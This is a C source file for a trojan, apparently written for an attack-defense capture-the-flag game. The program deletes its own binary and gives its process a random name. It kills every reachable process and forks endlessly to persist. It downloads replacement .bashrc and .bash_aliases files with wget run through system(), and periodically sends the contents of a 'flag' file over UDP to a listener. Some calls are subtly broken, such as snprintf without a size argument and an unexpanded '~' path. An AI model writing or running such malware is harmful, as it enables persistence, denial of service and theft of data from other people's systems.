#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h> 
#include <sys/prctl.h>
#include <sys/socket.h>
#include <signal.h>
#include <netinet/in.h>
#include <arpa/inet.h>

# define GET_FLAG 		50000
# define CLEAN_HORSE		10000
# define CHECK_HORSE		1000
//To Get Flag
# define DESTPORT		8888
# define DESTIP			"127.0.0.1"
# define FLAG_FILE		"flag"
# define SERVER			"http://127.0.0.1:1234/"
unsigned int count;
struct timespec last_mtim[2];
unsigned int create_flag;

void delete_self(){
	unsigned int f;
	unsigned char file[30]={0};
	f = open("/proc/self/cmdline",0);
	read(f,file,29);
	close(f);
	remove(file);
	return;
}

void change_name(int argc, char** argv){
	unsigned int f;
	unsigned char newname[9] = {0};
	f = open("/dev/urandom",0);
	read(f,newname,8);
	close(f);
	prctl(PR_SET_NAME, newname);
	strcpy(argv[0], newname);
	return;
}

void get_flag(){
	unsigned int sock;
	unsigned int f;
	struct sockaddr_in servaddr;
	char buf[100]={0};

	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
		exit(0);
	
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(DESTPORT);
	servaddr.sin_addr.s_addr = inet_addr(DESTIP);
	
	f = open(FLAG_FILE);
	read(f, buf, 100);

	sendto(sock, buf, strlen(buf), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
	exit(0);
}

int check_horse(){
	struct stat st;
	stat("~/.bashrc", &st);
	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
		return 1;
	}
	if(stat("~/.bash_aliases", &st) == 0){
		if(st.st_mtim.tv_sec == last_mtim[1].tv_sec && st.st_mtim.tv_nsec == last_mtim[1].tv_nsec)
			return 0;
	}
	exit(0);
}

void create_alias(){
	//create .bashrc && bash_aliases
	unsigned char cmd[100];
	snprintf(cmd, "wget %s%s -o %s", SERVER, "bashrc", "~/.bashrc");
	system(cmd);
	snprintf(cmd, "wget %s%s -o %s", SERVER, "bash_aliases", "~/.bash_aliases");
	system(cmd);
}

void store_time(){
	struct stat st;
	stat("~/.bashrc", &st);
	if(st.st_mtim.tv_sec != last_mtim[0].tv_sec || st.st_mtim.tv_nsec != last_mtim[0].tv_nsec){
		last_mtim[0] = st.st_mtim;
		stat("~/.bash_aliases", &st);
		last_mtim[1] = st.st_mtim;	
		create_flag = 0;	
	}
	return;	
}

void horse(int argc, char** argv){
	BEGIN:	
	count++;
	change_name(argc, argv);
	unsigned int p;

	if(create_flag)
		store_time();

	if(count % GET_FLAG == 0){
		if(!fork())
			get_flag();
	}
	if(count % CHECK_HORSE == 0){
		if(check_horse()){
			create_flag = 1;
			if(!fork())
				create_alias();
		}
	}

	if(count % CLEAN_HORSE == 0)
		kill(-1, SIGKILL);
	
	p = fork();
	if(p < 0 ) return;
	if(!p){
		goto BEGIN;
	}
	exit(0);
}

void main(int argc, char* argv[]){
	count = 0;
	unsigned int p;
	kill(-1, SIGKILL);
	delete_self();
	create_alias();
	store_time();

	p = fork();
	if(p < 0) exit(0);
	if(!p){
		horse(argc, argv);
	}
	exit(0);
}
